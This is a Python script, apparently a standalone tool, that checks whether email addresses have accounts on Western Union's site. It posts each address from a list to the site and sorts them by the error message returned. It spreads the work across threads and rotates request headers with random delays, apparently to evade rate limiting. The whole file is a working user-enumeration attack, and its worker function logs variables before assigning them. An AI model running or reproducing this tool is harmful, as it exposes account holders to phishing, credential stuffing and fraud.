import json
import queue
import urllib
import argparse
from threading import Thread, Lock, current_thread

from logger import log
from utils import random_delay
from random_requests import RANDOM_REQUESTS


parser = argparse.ArgumentParser()
parser.add_argument('-w', '--workers', type=int, default=4, help="Number of workers to be used")

args = parser.parse_args()

NUMBER_OF_WORKERS = args.workers

workers_data = queue.Queue()
lock = Lock()

def make_requests():
    global workers_data
    emails = open('data/emails.txt','r').readlines()
    emails_per_workers = int(len(emails) / NUMBER_OF_WORKERS) + bool(len(emails) % NUMBER_OF_WORKERS)
    headers_per_workers = int(len(RANDOM_REQUESTS) / NUMBER_OF_WORKERS) + bool(len(RANDOM_REQUESTS) % NUMBER_OF_WORKERS)

    worker_headers = []
    worker_emails = []

    # Distribute header sets and emails equally between the workers
    for i in range(NUMBER_OF_WORKERS):
        start_h = i * headers_per_workers
        end_h = start_h + headers_per_workers

        worker_headers = RANDOM_REQUESTS[start_h:end_h]

        start_e = i * emails_per_workers
        end_e = start_e + emails_per_workers
        worker_emails = emails[start_e:end_e]

        workers_data.put([worker_headers, worker_emails])


def request_www_westernunion_com(prepared_requests, emails):
    worker_name = current_thread().name
    emails_per_request = int(len(emails) / len(prepared_requests)) + bool(len(emails) % len(prepared_requests))

    for idx, prepared_request in enumerate(prepared_requests):
        subset_start = idx * emails_per_request
        subset_end = subset_start + emails_per_request 

        for email in emails[subset_start:subset_end]:
            try:
                request, session_id = prepared_request
                
                body = json.dumps({
                    'email': email,
                    'security': {
                        'session': {
                            'id': session_id
                        },
                        'version': '2'
                    },
                    'bashPath': '/us/en'
                }).encode()


                random_delay(4, 6)

                response = urllib.request.urlopen(request, body)
                data = response.fp.read()
                if data:
                    # Get the message from the response
                    msg = json.loads(data.decode('utf-8'))['error']['message']

                    # Email IS NOT registered
                    if "We can't find that email address" in msg:
                        log.info('{}: Not registered: {}'.format(worker_name, email))
                        with open('data/not_registered_emails.txt', 'a') as fp:
                            fp.write(email)
                    
                    # Email IS registered
                    elif "There's already an account with this email address" in msg:
                        log.info('{}: Registered: {}'.format(worker_name, email))
                        with open('data/registered_emails.txt', 'a') as fp:
                            fp.write(email)
                    
                    # Other message
                    else:
                        log.info('{}: {}'.format(worker_name, msg))
                
                # No data received in response
                else:
                    log.info('{}: Status: {}, Message: {}, Data: {}'.format(
                        worker_name, response.status, response.msg, data)
                    )
                    with open('data/failed_emails.txt', 'a') as fp:
                        fp.write(email)

            except urllib.error.URLError as e:
                if not hasattr(e, "code"):
                    return False
                raise e

            except Exception as e:
                raise e



def worker():
    while True:
        with lock:
            data = workers_data.get()
        if not data:
            break
        log.info('{} has: {} requests, {} emails'.format(current_thread().name, len(requests), len(emails)))
        requests, emails = data
        request_www_westernunion_com(requests, emails)
        # workers_data.task_done()
        # time.sleep(1)

make_requests()

threads = []
for i in range(NUMBER_OF_WORKERS):
    t = Thread(target=worker, name='worker {}'.format(i))
    t.start()
    threads.append(t)




# block until all tasks are done
# workers_data.join()

# Stop workers
for i in range(NUMBER_OF_WORKERS):
    workers_data.put(None)
for t in threads:
    t.join()









# def worker():
#     while True:
#         item = workers_data.get()
#         if item is None:
#             break
#         do_work(item)
#         workers_data.task_done()

# threads = []
# for i in range(NUMBER_OF_WORKERS):
#     t = threading.Thread(target=worker)
#     t.start()
#     threads.append(t)

# for item in source():
#     workers_data.put(item)

# # block until all tasks are done
# workers_data.join()

# # stop workers
# for i in range(NUMBER_OF_WORKERS):
#     workers_data.put(None)
# for t in threads:
#     t.join()